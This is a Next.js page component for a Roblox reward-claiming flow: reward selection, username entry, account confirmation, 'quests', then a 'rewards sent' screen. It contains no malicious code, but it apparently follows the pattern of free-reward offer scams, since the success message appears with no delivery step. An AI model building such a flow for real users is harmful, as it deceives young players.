"use client"

import { useState, memo } from "react"
import { RewardSelection } from "@/components/reward-selection"
import { UsernameEntry } from "@/components/username-entry"
import { UserVerification } from "@/components/user-verification"
import { QuestInterface } from "@/components/quest-interface"
import { useLanguage } from "@/lib/i18n/language-context"

interface RobloxUser {
  userId: number
  username: string
  displayName: string
  avatarUrl: string
}

const MemoizedRewardSelection = memo(RewardSelection)
const MemoizedUsernameEntry = memo(UsernameEntry)
const MemoizedUserVerification = memo(UserVerification)
const MemoizedQuestInterface = memo(QuestInterface)

export default function Home() {
  const { t } = useLanguage()
  const [currentStep, setCurrentStep] = useState<"rewards" | "username" | "verification" | "quests" | "complete">(
    "rewards",
  )
  const [selectedRewards, setSelectedRewards] = useState<string[]>([])
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)

  // Handle rewards selection
  const handleRewardsSelected = (rewards: string[]) => {
    setSelectedRewards(rewards)
    setCurrentStep("username")
  }

  // Handle user verification
  const handleUserVerified = (userData: RobloxUser) => {
    setRobloxUser(userData)
    setCurrentStep("verification")
  }

  // Handle verification confirmation
  const handleVerificationConfirmed = () => {
    setCurrentStep("quests")
  }

  // Handle verification denial
  const handleVerificationDenied = () => {
    setCurrentStep("username")
    setRobloxUser(null)
  }

  // Handle quests completion
  const handleQuestsCompleted = () => {
    setCurrentStep("complete")
  }

  return (
    <div className="main-background min-h-screen">
      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 min-h-screen">
        {/* Main Content */}
        <div className="flex items-center justify-center min-h-screen">
          {currentStep === "rewards" && <MemoizedRewardSelection onRewardsSelected={handleRewardsSelected} />}

          {currentStep === "username" && (
            <MemoizedUsernameEntry selectedRewards={selectedRewards} onUserVerified={handleUserVerified} />
          )}

          {currentStep === "verification" && robloxUser && (
            <MemoizedUserVerification
              user={robloxUser}
              onConfirm={handleVerificationConfirmed}
              onDeny={handleVerificationDenied}
            />
          )}

          {currentStep === "quests" && robloxUser && (
            <MemoizedQuestInterface
              onComplete={handleQuestsCompleted}
              userId={robloxUser.userId}
              username={robloxUser.username}
              selectedRewards={selectedRewards}
            />
          )}

          {currentStep === "complete" && (
            <div className="text-center bg-white/95 backdrop-blur-md p-8 rounded-3xl shadow-2xl border border-gray-200">
              <h1 className="text-4xl font-bold mb-4 text-green-600">{t.rewardsClaimedSuccess}</h1>
              <p className="text-xl text-gray-700 mb-6">{t.rewardsSent}</p>
              {robloxUser && (
                <div className="mt-4 p-4 bg-gray-50 rounded-xl border border-gray-200">
                  <p className="text-lg text-blue-600">
                    {t.sentTo} {robloxUser.displayName} (@{robloxUser.username})
                  </p>
                  <p className="text-sm mt-2 text-gray-500">User ID: {robloxUser.userId}</p>
                </div>
              )}
              <div className="mt-6">
                <p className="text-lg font-bold text-gray-700 mb-3">{t.selectedRewards}:</p>
                <div className="flex justify-center space-x-4 mt-2">
                  {selectedRewards.map((reward) => (
                    <span
                      key={reward}
                      className="px-4 py-2 bg-green-100 text-green-700 rounded-full border border-green-300"
                    >
                      {reward}
                    </span>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
